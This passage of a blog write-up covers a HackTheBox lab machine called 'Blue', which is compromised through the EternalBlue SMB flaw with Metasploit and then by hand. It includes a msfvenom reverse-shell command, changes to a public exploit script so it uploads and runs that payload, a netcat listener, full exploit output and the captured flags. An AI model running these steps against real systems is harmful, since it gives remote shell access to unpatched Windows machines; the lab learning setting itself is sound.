+[*] 10.10.10.40:445 - Receiving response from exploit packet
+[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 10.10.10.40:445 - Sending egg to corrupted connection.
+[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
+[*] Sending stage (201283 bytes) to 10.10.10.40
+[*] Meterpreter session 1 opened (10.10.16.195:4444 -&gt; 10.10.10.40:54571) at 2020-07-07 12:02:07 +0100
+[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+meterpreter &gt; 
+</code></pre><p>Even though the module was successful, it failed several times beforehand.  I looked around and the initial search in Metasploit explained that the module I used was given an <code>average</code> ranking. This is an indicator of potential success. The next step is to create a shell session so that I can access Blue&rsquo;s file system.</p>
+<h1 id="post-exploitation"><strong>Post Exploitation</strong></h1>
+<h3 id="step-1---create-tty-shell">Step 1 - Create TTY shell</h3>
+<pre><code>meterpreter &gt; shell
+Process 1376 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32&gt;
+</code></pre><blockquote>
+<p>At this point, my first action SHOULD have been to run a <code>whoami</code> command to determine the available account privileges. I&rsquo;ll remember this for next time.</p>
+</blockquote>
+<h3 id="step-2---get-to-base-of-file-system">Step 2 - Get to base of file system</h3>
+<p>When the shell was created, it placed me in the <code>system32</code> folder, I want to get to the base of the file system before looking for the root flag.</p>
+<pre><code>C:\Windows\system32&gt;CD \
+CD \
+
+C:\&gt;
+</code></pre><h3 id="step-3---find-roottxt-file">Step 3 - Find root.txt file</h3>
+<p>I am now at the base of the C drive and will attempt to find the root flag. I will start by listing the contents of my current working directory.</p>
+<pre><code>C:\&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A0EF-1911
+
+ Directory of C:\
+
+07/07/2020  02:04            73,802 eternalblue1.exe
+14/07/2009  04:20    &lt;DIR&gt;          PerfLogs
+24/12/2017  03:23    &lt;DIR&gt;          Program Files
+14/07/2017  17:58    &lt;DIR&gt;          Program Files (x86)
+07/07/2020  02:04                 0 pwned.txt
+14/07/2017  14:48    &lt;DIR&gt;          Share
+21/07/2017  07:56    &lt;DIR&gt;          Users
+07/07/2020  07:14    &lt;DIR&gt;          Windows
+               2 File(s)         73,802 bytes
+               6 Dir(s)  15,448,350,720 bytes free
+</code></pre><p>There is a folder called <code>Users</code> which I suspect will hold the root flag.</p>
+<pre><code>C:\&gt;cd Users    
+cd Users
+
+C:\Users&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A0EF-1911
+
+ Directory of C:\Users
+
+21/07/2017  07:56    &lt;DIR&gt;          .
+21/07/2017  07:56    &lt;DIR&gt;          ..
+21/07/2017  07:56    &lt;DIR&gt;          Administrator
+14/07/2017  14:45    &lt;DIR&gt;          haris
+12/04/2011  08:51    &lt;DIR&gt;          Public
+               0 File(s)              0 bytes
+               5 Dir(s)  15,448,350,720 bytes free
+
+C:\Users&gt;
+</code></pre><p>Within Users, there is a folder called <code>Administrator</code> &hellip;</p>
+<pre><code>C:\Users&gt;cd Administrator
+cd Administrator
+
+C:\Users\Administrator&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A0EF-1911
+
+ Directory of C:\Users\Administrator
+
+21/07/2017  07:56    &lt;DIR&gt;          .
+21/07/2017  07:56    &lt;DIR&gt;          ..
+21/07/2017  07:56    &lt;DIR&gt;          Contacts
+24/12/2017  03:22    &lt;DIR&gt;          Desktop
+21/07/2017  07:56    &lt;DIR&gt;          Documents
+21/07/2017  07:56    &lt;DIR&gt;          Downloads
+21/07/2017  07:56    &lt;DIR&gt;          Favorites
+21/07/2017  07:56    &lt;DIR&gt;          Links
+21/07/2017  07:56    &lt;DIR&gt;          Music
+21/07/2017  07:56    &lt;DIR&gt;          Pictures
+21/07/2017  07:56    &lt;DIR&gt;          Saved Games
+21/07/2017  07:56    &lt;DIR&gt;          Searches
+21/07/2017  07:56    &lt;DIR&gt;          Videos
+               0 File(s)              0 bytes
+              13 Dir(s)  15,448,350,720 bytes free
+
+C:\Users\Administrator&gt;
+</code></pre><p>From previous experience, the root.txt file has been held in the Desktop folder of the Administrator, so I&rsquo;ll check there first before looking elsewhere.</p>
+<pre><code>C:\Users\Administrator&gt;cd Desktop 
+cd Desktop 
+
+C:\Users\Administrator\Desktop&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A0EF-1911
+
+ Directory of C:\Users\Administrator\Desktop
+
+24/12/2017  03:22    &lt;DIR&gt;          .
+24/12/2017  03:22    &lt;DIR&gt;          ..
+21/07/2017  07:57                32 root.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  15,448,350,720 bytes free
+
+C:\Users\Administrator\Desktop&gt;
+</code></pre><p>The Desktop does indeed contain the file root.txt, so I check its contents. It contains a value that can be submitted to the HackTheBox dashboard.</p>
+<pre><code>C:\Users\Administrator\Desktop&gt;more root.txt
+more root.txt
+ff548eb71e920ff6c08843ce9df4e717
+</code></pre><p>I have now pwned Blue with Metasploit. The next task is to do the same but without Metasploit.</p>
+<h1 id="section-2---without-metasploit"><strong>Section 2 - Without Metasploit</strong></h1>
+<p>Since I have already done the nmap scanning, I don&rsquo;t need to repeat it again &hellip;</p>
+<h1 id="enumeration-1"><strong>Enumeration</strong></h1>
+<h3 id="step-1---find-ms17-010-exploit-script">Step 1 - Find MS17-010 exploit script</h3>
+<p>After doing a bit of a search on Github, I was able to find a repo (repository) that contained a python script for exploiting MS17-010.</p>
+<blockquote>
+<p><a href="https://github.com/worawit/MS17-010"><code>https://github.com/worawit/MS17-010</code></a></p>
+</blockquote>
+<p>There were several repos available but they were all pretty similiar in design. I tried using the same approach as I did for Legacy but it didn&rsquo;t work for some reason. I looked at a walkthrough of Legacy (AFTER I had done it with Metasploit, of course) for EternalBlue, and that this script was used by others. So, the worawit exploit was my best opportunity.</p>
+<h3 id="step-2---clone-github-repo">Step 2 - Clone github repo</h3>
+<pre><code>student@teacher:~/hackthebox/Blue$ git clone https://github.com/worawit/MS17-010.git
+Cloning into 'MS17-010'...
+remote: Enumerating objects: 183, done.
+remote: Total 183 (delta 0), reused 0 (delta 0), pack-reused 183
+Receiving objects: 100% (183/183), 113.61 KiB | 672.00 KiB/s, done.
+Resolving deltas: 100% (102/102), done.
+</code></pre><pre><code>student@teacher:~/hackthebox/Blue/MS17-010$ ls
+BUG.txt                  eternalblue_exploit8.py  eternalchampion_poc2.py  eternalromance_poc2.py  eternalsynergy_poc.py  npp_control.py  zzz_exploit.py
+checker.py               eternalblue_poc.py       eternalchampion_poc.py   eternalromance_poc.py   infoleak_uninit.py     README.md
+eternalblue_exploit7.py  eternalchampion_leak.py  eternalromance_leak.py   eternalsynergy_leak.py  mysmb.py               shellcode
+</code></pre><h1 id="exploitation-1"><strong>Exploitation</strong></h1>
+<h3 id="step-1---create-reverse-shell-payload">Step 1 - Create reverse shell payload</h3>
+<p>Given that this is a manual exploit, I need to create a payload myself using <code>msfvenom</code>.</p>
+<pre><code>student@teacher:~/hackthebox/Blue/MS17-010$ msfvenom -p windows/shell/reverse_tcp LHOST=10.10.16.195 LPORT=4444 -f exe &gt; shell.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 341 bytes
+Final size of exe file: 73802 bytes
+</code></pre><p>I use the tool to create a staged reverse shell payload in the form of a Windows executable application (.exe). I tried a stageless payload (windows/shell_reverse_tcp) but it did not work for some reason, so I reverted to a staged payload instead (windows/shell/reverse_tcp). I set the IP of my system and a random port that is used to receive the connection from Blue.</p>
+<blockquote>
+<p>A staged payload is one in which the code that makes up the payload is sent in segments. A non-staged payload is one in which the payload&rsquo;s code is sent all at once. Non-staged payloads are larger in size compared to staged payloads but staged payloads are less stable since it cannot be guaranteed that all the code pieces will be successfully transferred.</p>
+</blockquote>
+<h3 id="step-2---modify-exploit-script">Step 2 - Modify exploit script</h3>
+<p>When trying to run the exploit script <code>zzz_exploit</code> (as described in the github repo instructions) with the payload <code>shell.exe</code>, it would come back with several errors regarding the SMB server and the payload.  After a bit of research I found out that in order for the script to work, it needs to be modified.</p>
+<p>I first need to find the lines in the script where the USERNAME and PASSWORD is specified for the SMB server.</p>
+<pre><code>USERNAME = ''
+PASSWORD = ''
+</code></pre><p>The server can be accessed as <code>guest</code> so I must edit the USERNAME parameter to facilitate this as follows.</p>
+<pre><code>USERNAME = '//'
+PASSWORD = ''
+</code></pre><p>The next section that needs modifying is a function within the script called <code>smb_pwn</code>. This function can only work if it has the file path of the reverse shell payload I created and that the name is correct.</p>
+<pre><code>def smb_pwn(conn, arch):
+        smbConn = conn.get_smbconnection()
+        
+        print('creating file c:\\pwned.txt on the target')
+        tid2 = smbConn.connectTree('C$')
+        fid2 = smbConn.createFile(tid2, '/pwned.txt')
+        smbConn.closeFile(tid2, fid2)
+        smbConn.disconnectTree(tid2)
+        
+        #smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
+        #service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
+        # Note: there are many methods to get shell over SMB admin session
+        # a simple method to get shell (but easily to be detected by AV) is
+        # executing binary generated by &quot;msfvenom -f exe-service ...&quot;
+</code></pre><p>I must uncomment the lines calling the functions <code>smb_send_file</code> and <code>service_exec</code> then give the correct name and file path for my payload. It now looks like the following:</p>
+<pre><code>def smb_pwn(conn, arch):
+        smbConn = conn.get_smbconnection()
+        
+        print('creating file c:\\pwned.txt on the target')
+        tid2 = smbConn.connectTree('C$')
+        fid2 = smbConn.createFile(tid2, '/pwned.txt')
+        smbConn.closeFile(tid2, fid2)
+        smbConn.disconnectTree(tid2)
+        
+        smb_send_file(smbConn, '/home/student/hackthebox/Blue/MS17-010/shell.exe', 'C', '/shell.exe')
+        service_exec(conn, r'cmd /c c:\\shell.exe')
+        # Note: there are many methods to get shell over SMB admin session
+        # a simple method to get shell (but easily to be detected by AV) is
+        # executing binary generated by &quot;msfvenom -f exe-service ...&quot;
+</code></pre><h3 id="step-3---setup-listening-port">Step 3 - Setup listening port</h3>
+<p>When the payload executes the script it will attempt to establish a connection with my attacking box, I need to setup a listener to receive the incoming connection from the victim (Blue). The port used as part of the listener must be the same port specified when I created the payload (4444 - a default/popular value).</p>
+<pre><code>student@teacher:~/hackthebox/Blue$ nc -nlvp 4444
+listening on [any] 4444 ...
+</code></pre><h2 id="step-4---execute-script">Step 4 - Execute script</h2>
+<p>In a different tab from the listener, I execute the script with the payload.  The <code>ntsvcs</code> switch ensures a stable connection between Blue and my attacking box.</p>
+<pre><code>student@teacher:~/hackthebox/Blue/MS17-010$ python zzz_exploit.py 10.10.10.40 ntsvcs
+Target OS: Windows 7 Professional 7601 Service Pack 1
+Target is 64 bit
+Got frag size: 0x10
+GROOM_POOL_SIZE: 0x5030
+BRIDE_TRANS_SIZE: 0xfa0
+CONNECTION: 0xfffffa8001c325f0
+SESSION: 0xfffff8a003986120
+FLINK: 0xfffff8a00c419048
+InParam: 0xfffff8a0029d815c
+MID: 0x603
+unexpected alignment, diff: 0x9a40048
+leak failed... try again
+CONNECTION: 0xfffffa8001c325f0
+SESSION: 0xfffff8a003986120
+FLINK: 0xfffff8a0192dd048
+InParam: 0xfffff8a002ae515c
+MID: 0x602
+unexpected alignment, diff: 0x167f7048
+leak failed... try again
+CONNECTION: 0xfffffa8001c325f0
+SESSION: 0xfffff8a003986120
+FLINK: 0xfffff8a0192db048
+InParam: 0xfffff8a002b5515c
+MID: 0x702
+unexpected alignment, diff: 0x16785048
+leak failed... try again
+CONNECTION: 0xfffffa8001c325f0
+SESSION: 0xfffff8a003986120
+FLINK: 0xfffff8a0030f5088
+InParam: 0xfffff8a002ecc15c
+MID: 0x703
+unexpected alignment, diff: 0x228088
+leak failed... try again
+CONNECTION: 0xfffffa8001c325f0
+SESSION: 0xfffff8a003986120
+FLINK: 0xfffff8a002b4d048
+InParam: 0xfffff8a0030fb15c
+MID: 0x70a
+unexpected alignment, diff: 0x-5aefb8
+leak failed... try again
+CONNECTION: 0xfffffa8001c325f0
+SESSION: 0xfffff8a003986120
+FLINK: 0xfffff8a003328088
+InParam: 0xfffff8a0032cf15c
+MID: 0x703
+unexpected alignment, diff: 0x58088
+leak failed... try again
+CONNECTION: 0xfffffa8001c325f0
+SESSION: 0xfffff8a003986120
+FLINK: 0xfffff8a0014f2048
+InParam: 0xfffff8a00343815c
+MID: 0x802
+unexpected alignment, diff: 0x-1f46fb8
+leak failed... try again
+CONNECTION: 0xfffffa8001c325f0
+SESSION: 0xfffff8a003986120
+FLINK: 0xfffff8a0034f2088
+InParam: 0xfffff8a0034ec15c
+MID: 0x807
+success controlling groom transaction
+modify trans1 struct for arbitrary read/write
+make this SMB session to be SYSTEM
+overwriting session security context
+creating file c:\pwned.txt on the target
+Opening SVCManager on 10.10.10.40.....
+Creating service XUHw.....
+Starting service XUHw.....
+The NETBIOS connection with the remote host timed out.
+Removing service XUHw.....
+ServiceExec Error on: 10.10.10.40
+nca_s_proto_error
+Done
+</code></pre><p>Once the script has been executed, I go back to the tab where I established my listener for Blue.</p>
+<pre><code>student@teacher:~/hackthebox/Blue/MS17-010$ nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.195] from (UNKNOWN) [10.10.10.40] 49158
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32&gt;
+</code></pre><p>With access to Blue&rsquo;s file system, I now need to find the user and root flags.</p>
+<h1 id="post-exploitation-1"><strong>Post Exploitation</strong></h1>
+<h3 id="step-1---get-user-flag">Step 1 - Get user flag</h3>
+<pre><code>C:\Users&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A0EF-1911
+
+ Directory of C:\Users
+
+21/07/2017  07:56    &lt;DIR&gt;          .
+21/07/2017  07:56    &lt;DIR&gt;          ..
+21/07/2017  07:56    &lt;DIR&gt;          Administrator
+14/07/2017  14:45    &lt;DIR&gt;          haris
+12/04/2011  08:51    &lt;DIR&gt;          Public
+               0 File(s)              0 bytes
+               5 Dir(s)  15,462,371,328 bytes free
+</code></pre><p>Up to this point I was unaware that with HackTheBox, you are supposed to submit a user flag as well as the root flag. I suspect this mechanism is used to recognise getting a basic foothold on the system (even if without root/admin/system access).  There is one user within Blue called <code>haris</code>, so I check their folder to hopefully get the user flag.</p>
+<pre><code>C:\Users\haris\Desktop&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A0EF-1911
+
+ Directory of C:\Users\haris\Desktop
+
+24/12/2017  03:23    &lt;DIR&gt;          .
+24/12/2017  03:23    &lt;DIR&gt;          ..
+21/07/2017  07:54                32 user.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  15,467,188,224 bytes free
+</code></pre><p>There is a file called <code>user.txt</code> in haris&rsquo;s Desktop folder which I need to check and submit to HackTheBox, in the hope it really is the user flag.</p>
+<pre><code>C:\Users\haris\Desktop&gt;more user.txt
+more user.txt
+4c546aea7dbee75cbd71de245c8deea9
+</code></pre><p>I submitted this value to HackTheBox and it was correct. The next task is to get the root flag in Blue.</p>
+<h3 id="get-root-flag">Get Root Flag</h3>
+<pre><code>C:\Users\Administrator\Desktop&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A0EF-1911
+
+ Directory of C:\Users\Administrator\Desktop
+
+24/12/2017  03:22    &lt;DIR&gt;          .
+24/12/2017  03:22    &lt;DIR&gt;          ..
+21/07/2017  07:57                32 root.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  15,467,171,840 bytes free
+</code></pre><pre><code>C:\Users\Administrator\Desktop&gt;more root.txt
+more root.txt
+ff548eb71e920ff6c08843ce9df4e717
+</code></pre><p>Mission accomplished!</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>This whole box was a good learning curve in how to take manual exploit code, modify it and make it establish a reverse shell conenction with my attacking box. I also learned not to over-complicate things and not to waste time hunting down rabit holes.  Sometimes it pays to do some really obvious things - the clue was in the name of the box afterall.</p>
+
+					</div>
+					<div class="post-comments">
+						
+					</div>
+				</div>
+			</div>
+      <div class="col-md-4">
+        <aside class="sidebar"><div class="widget widget-latest-post">
+    <h4 class="widget-title">Latest Posts</h4>
+    
+    <div class="media">
+      <a class="pull-left" href="http://192.168.1.191/blog/nibbles/">
+        <img class="media-object" src="/images/blog/nibbles/nibbles_image.jpg" alt="Nibbles HackTheBox - Write-Up">
+      </a>
+      <div class="media-body">
+        <h4 class="media-heading"><a href="http://192.168.1.191/blog/nibbles/">Nibbles HackTheBox - Write-Up</a></h4>
+        <p>This writeup will demonstrate my approach for …</p>
+      </div>
+    </div>
+    
+    <div class="media">
+      <a class="pull-left" href="http://192.168.1.191/blog/jerry/">
+        <img class="media-object" src="/images/blog/jerry/snippet_1.png" alt="Jerry HackTheBox - Write-Up">
+      </a>
+      <div class="media-body">
+        <h4 class="media-heading"><a href="http://192.168.1.191/blog/jerry/">Jerry HackTheBox - Write-Up</a></h4>
+        <p>This writeup will be my approach for …</p>
+      </div>
+    </div>
+    
+    <div class="media">
+      <a class="pull-left" href="http://192.168.1.191/blog/devel/">
+        <img class="media-object" src="/images/blog/devel/cover.jpg" alt="Devel HackTheBox - Write-Up">
+      </a>
+      <div class="media-body">
+        <h4 class="media-heading"><a href="http://192.168.1.191/blog/devel/">Devel HackTheBox - Write-Up</a></h4>
+        <p>The first three &lsquo;HackTheBox&rsquo; writeups …</p>
+      </div>
+    </div>
+    
+    <div class="media">
+      <a class="pull-left" href="http://192.168.1.191/blog/blue/">
+        <img class="media-object" src="/images/blog/blue/cover.jpg" alt="Blue HackTheBox - Write-Up">
+      </a>
+      <div class="media-body">
+        <h4 class="media-heading"><a href="http://192.168.1.191/blog/blue/">Blue HackTheBox - Write-Up</a></h4>
+        <p>This blog piece details my approach for pwning the …</p>
+      </div>
+    </div>
+    
+  </div><div class="widget widget-category">
+    <h4 class="widget-title">Categories</h4>
+    <ul class="widget-category-list">
+      <li><a href="/categories/hackthebox">Hackthebox</a></li>
+    </ul>
+  </div><div class="widget widget-tag">
+    <h4 class="widget-title">Tags</h4>
+    <ul class="widget-tag-list">
+      <li><a href="/tags/apache">Apache</a></li>
+      <li><a href="/tags/distcc">Distcc</a></li>
+      <li><a href="/tags/eternalblue">Eternalblue</a></li>
+      <li><a href="/tags/exploit-compilation">Exploit compilation</a></li>
+      <li><a href="/tags/exploit-modification">Exploit modification</a></li>
+      <li><a href="/tags/ftp">Ftp</a></li>
+      <li><a href="/tags/hackthebox">Hackthebox</a></li>
+      <li><a href="/tags/http">Http</a></li>
+      <li><a href="/tags/linux">Linux</a></li>
+      <li><a href="/tags/misconfiguration">Misconfiguration</a></li>
+      <li><a href="/tags/privesc">Privesc</a></li>
+      <li><a href="/tags/smb">Smb</a></li>
+      <li><a href="/tags/spidering">Spidering</a></li>
+      <li><a href="/tags/tty">Tty</a></li>
+      <li><a href="/tags/tty-shell">Tty shell</a></li>
+      <li><a href="/tags/web-shell">Web shell</a></li>
+      <li><a href="/tags/windows">Windows</a></li>
+    </ul>
+  </div></aside>
+
+      </div>
+		</div>
+	</div>
+</section>
+
+<footer class="footer">
+	<div class="container">
+		<div class="row">
+			<div class="col-md-12">
+				<div class="footer-manu">
+					<ul>
+            
+            <li><a href="http://192.168.1.191/about">About</a></li>
+            
+            <li><a href="http://192.168.1.191/project">Project</a></li>
+            
+            <li><a href="http://192.168.1.191/blog">Blog</a></li>
+            
+					</ul>
+				</div>
+				<p class="copyright">Copyright © 2020 <a href="https://themefisher.com">Themefisher</a> All Rights Reserved</p>
+			</div>
+		</div>
+	</div>
+</footer>
+
+
+
+<script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyCcABaamniA6OL5YvYSpB3pFMNrXwXnLwU&amp;libraries=places"></script>
+
+
+
+
+<script src="http://192.168.1.191/plugins/jQuery/jquery.min.js"></script>
+
+<script src="http://192.168.1.191/plugins/bootstrap/bootstrap.min.js"></script>
+
+<script src="http://192.168.1.191/plugins/slick/slick.min.js"></script>
+
+<script src="http://192.168.1.191/plugins/magnific-popup/jquery.magnific-popup.min.js"></script>
+
+<script src="http://192.168.1.191/plugins/shuffle/shuffle.min.js"></script>
+
+<script src="http://192.168.1.191/plugins/google-map/gmap.js"></script>
+
+
+
+
+<script src="http://192.168.1.191/js/script.min.js"></script>
+
+
+</body>
+
+</html>
